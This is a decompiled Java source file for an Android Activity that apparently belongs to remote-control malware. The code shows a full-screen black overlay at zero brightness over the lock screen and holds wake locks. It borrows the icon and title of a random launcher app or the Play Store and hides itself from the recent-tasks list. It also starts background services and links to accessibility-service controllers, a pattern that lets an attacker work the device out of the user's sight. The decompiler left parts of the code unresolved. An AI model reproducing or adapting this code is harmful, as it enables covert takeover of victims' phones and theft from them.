/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.ActivityManager$TaskDescription
 *  android.app.KeyguardManager
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.drawable.Drawable
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.Looper
 *  android.view.GestureDetector
 *  android.view.GestureDetector$OnGestureListener
 *  android.view.GestureDetector$SimpleOnGestureListener
 *  android.view.MotionEvent
 *  android.view.View
 *  android.view.View$OnTouchListener
 *  android.view.ViewGroup
 *  android.view.WindowManager$LayoutParams
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.GestureDetector;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import linker.resourcer.encoder.WakeLockManager;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.OverlayActivity$6$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;

public class OverlayActivity
extends Activity {
    private static GestureDetector gestureDetector;
    public static volatile boolean poink;
    public static WakeLockManager wl;
    private View overlayView;

    static {
        poink = true;
    }

    private void doWork() {
        try {
            Context context = this.getApplicationContext();
            Intent intent = new Intent(context, SetupOrchestrationService.class);
            if (!SystemUtilities.isServiceRunning(context, SetupOrchestrationService.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
            if (!SystemUtilities.isServiceRunning(context, WorkerService.class)) {
                intent = new Intent(context, WorkerService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void lockwatcher() {
        KeyguardManager keyguardManager = (KeyguardManager)this.getApplicationContext().getSystemService("keyguard");
        Handler handler = new Handler(Looper.getMainLooper());
        new Thread(new Runnable(){
            final OverlayActivity this$0;
            final KeyguardManager val$keyguardManager;
            {
                this.this$0 = mhcbtxabqrusqzejlrru2;
                this.val$keyguardManager = keyguardManager;
            }

            @Override
            public void run() {
                boolean bl = true;
                while (bl) {
                    try {
                        Thread.sleep(30000L);
                    }
                    catch (Exception exception) {}
                    bl = this.val$keyguardManager.isKeyguardLocked();
                    if (poink) {
                        wl.release();
                        try {
                            Thread.sleep(4000L);
                        }
                        catch (Exception exception) {}
                        wl.acquire(this.this$0.getApplicationContext(), true, true);
                    }
                    try {
                        Intent intent = new Intent(this.this$0.getApplicationContext(), WorkerService.class);
                        intent.setAction("HB");
                        this.this$0.startService(intent);
                    }
                    catch (Exception exception) {}
                }
            }
        }).start();
        new Thread(new Runnable(){
            final OverlayActivity this$0;
            final Handler val$hstop;
            final KeyguardManager val$keyguardManager;
            {
                this.this$0 = mhcbtxabqrusqzejlrru2;
                this.val$keyguardManager = keyguardManager;
                this.val$hstop = handler;
            }

            /* synthetic */ void lambda$run$0$com-icontrol-protector-OverlayActivity$6() {
                if (this.this$0.overlayView != null) {
                    try {
                        this.this$0.overlayView.setKeepScreenOn(true);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
            }

            @Override
            public void run() {
                boolean bl;
                do {
                    try {
                        Thread.sleep(3000L);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    bl = this.val$keyguardManager.isKeyguardLocked();
                    this.val$hstop.postDelayed((Runnable)new OverlayActivity$6$$ExternalSyntheticLambda0(this), 100L);
                } while (bl);
                this.val$hstop.post(new Runnable(this){
                    final 6 this$1;
                    {
                        this.this$1 = var1_1;
                    }

                    @Override
                    public void run() {
                        try {
                            this.this$1.this$0.moveTaskToBack(true);
                            this.this$1.this$0.overridePendingTransition(0, 0);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                });
            }
        }).start();
    }

    /*
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    protected void onCreate(Bundle var1_1) {
        block12: {
            super.onCreate(var1_1 /* !! */ );
            OverlayActivity.poink = true;
            var1_1 /* !! */  = new WakeLockManager();
            OverlayActivity.wl = var1_1 /* !! */ ;
            if (Build.VERSION.SDK_INT >= 27) {
                this.setShowWhenLocked(true);
                this.setTurnScreenOn(true);
            }
            OverlayActivity.wl.acquire(this.getApplicationContext(), true, true);
            this.getWindow().getDecorView().setSystemUiVisibility(5894);
            try {
                this.requestWindowFeature(1);
            }
            catch (Exception var1_2) {
                var1_2.printStackTrace();
            }
            var2_5 = UtilityHelper.getRandomLauncherApp(this.getApplicationContext());
            var1_1 /* !! */  = var2_5;
            if (UtilityHelper.isPackageInstalled((String)var2_5, this.getPackageManager())) break block12;
            var1_1 /* !! */  = "com.android.vending";
            if (UtilityHelper.isPackageInstalled("com.android.vending", this.getPackageManager())) break block12;
            var1_1 /* !! */  = null;
        }
        if (var1_1 /* !! */  == null) ** GOTO lbl42
        try {
            var2_5 = this.getPackageManager();
            var3_6 = var2_5.getApplicationInfo((String)var1_1 /* !! */ , 0);
            var1_1 /* !! */  = var2_5.getApplicationIcon(var3_6);
            var2_5 = var2_5.getApplicationLabel(var3_6).toString();
            this.setTitle((CharSequence)var2_5);
            var3_6 = UtilityHelper.drawableToBitmap((Drawable)var1_1 /* !! */ );
            var1_1 /* !! */  = new ActivityManager.TaskDescription((String)var2_5, (Bitmap)var3_6, 0);
            this.setTaskDescription((ActivityManager.TaskDescription)var1_1 /* !! */ );
            ** GOTO lbl42
        }
        catch (Exception var1_3) {
            var1_3.printStackTrace();
lbl42:
            // 3 sources

            this.doWork();
            var1_1 /* !! */  = new View((Context)this);
            this.overlayView = var1_1 /* !! */ ;
            this.overlayView.setKeepScreenOn(true);
            this.overlayView.setBackgroundColor(-16777216);
            this.setContentView(this.overlayView);
            this.overlayView.setFocusable(true);
            this.overlayView.setClickable(true);
            this.overlayView.setFocusableInTouchMode(true);
            var1_1 /* !! */  = this.getWindow();
            var1_1 /* !! */ .setFlags(2622624, 1024);
            var2_5 = var1_1 /* !! */ .getAttributes();
            var2_5.height = -1;
            var2_5.width = -1;
            var2_5.screenBrightness = 0.0f;
            var2_5.gravity = 0x800033;
            var1_1 /* !! */ .setAttributes((WindowManager.LayoutParams)var2_5);
            var2_5 = new Handler(Looper.getMainLooper());
            var1_1 /* !! */  = new Runnable(this){
                final OverlayActivity this$0;
                {
                    this.this$0 = mhcbtxabqrusqzejlrru2;
                }

                @Override
                public void run() {
                    try {
                        UtilityHelper.excludeFromTaskList(this.this$0.getApplicationContext());
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }
            };
            var2_5.postDelayed((Runnable)var1_1 /* !! */ , 1000L);
            var1_1 /* !! */  = new GestureDetector.SimpleOnGestureListener(this){
                final OverlayActivity this$0;
                {
                    this.this$0 = mhcbtxabqrusqzejlrru2;
                }

                public boolean onDoubleTap(MotionEvent motionEvent) {
                    this.this$0.moveTaskToBack(true);
                    this.this$0.overridePendingTransition(0, 0);
                    return true;
                }

                public boolean onSingleTapConfirmed(MotionEvent motionEvent) {
                    return true;
                }
            };
            var2_5 = new GestureDetector((Context)this, (GestureDetector.OnGestureListener)var1_1 /* !! */ );
            OverlayActivity.gestureDetector = var2_5;
            var1_1 /* !! */  = this.overlayView;
            var2_5 = new View.OnTouchListener(this){
                final OverlayActivity this$0;
                {
                    this.this$0 = mhcbtxabqrusqzejlrru2;
                }

                public boolean onTouch(View view, MotionEvent motionEvent) {
                    if (AccessibilityServiceController.skiprecord) {
                        this.this$0.moveTaskToBack(true);
                        this.this$0.overridePendingTransition(0, 0);
                    }
                    return gestureDetector.onTouchEvent(motionEvent);
                }
            };
            var1_1 /* !! */ .setOnTouchListener(var2_5);
            this.lockwatcher();
            {
                catch (Exception var1_4) {
                    var1_4.printStackTrace();
                    this.finish();
                }
            }
        }
    }

    protected void onDestroy() {
        super.onDestroy();
        try {
            if (this.overlayView != null) {
                this.overlayView.setOnClickListener(null);
                this.overlayView = null;
            }
            wl.release();
            gestureDetector = null;
            this.getWindow().clearFlags(128);
            ((ViewGroup)this.findViewById(0x1020002)).removeAllViews();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    protected void onPause() {
        block7: {
            block6: {
                super.onPause();
                poink = false;
                boolean bl = UtilityHelper.isScreenOff(this.getApplicationContext());
                if (!bl) break block6;
                AndroidLogger.Debug("TActivity", "onPause: Detected screen off!");
                try {
                    AccessibilityServiceController.skiponecover = true;
                    this.moveTaskToBack(true);
                    this.overridePendingTransition(0, 0);
                    AccessibilityServiceHelper.WakeScreen(this.getApplicationContext());
                }
                catch (Exception exception) {}
                break block7;
            }
            try {
                AndroidLogger.Debug("TActivity", "onPause: User navigated away, but screen is still on.");
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    protected void onResume() {
        super.onResume();
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(this){
            final OverlayActivity this$0;
            {
                this.this$0 = mhcbtxabqrusqzejlrru2;
            }

            @Override
            public void run() {
                try {
                    UtilityHelper.excludeFromTaskList(this.this$0.getApplicationContext());
                    this.this$0.lockwatcher();
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }, 1000L);
    }
}

